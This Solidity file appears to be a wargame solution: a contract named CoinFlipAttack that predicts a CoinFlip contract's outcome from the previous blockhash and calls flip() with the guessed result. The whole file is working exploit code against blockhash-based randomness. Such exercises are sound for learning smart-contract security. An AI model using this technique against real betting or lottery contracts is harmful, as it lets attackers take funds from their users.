// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {CoinFlip} from "./Coinflip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinflip) {
        victimContract = coinflip;
    }

    function coinFlipGuess() public {
        uint256 blockVal = uint256(blockhash(block.number - 1));
        uint256 result = blockVal / FACTOR;
        bool flipStatus = result == 1 ? true : false;

        victimContract.flip(flipStatus);
    }

    function getConsecutiveWins() public view returns (uint256) {
        return victimContract.consecutiveWins();
    }
}
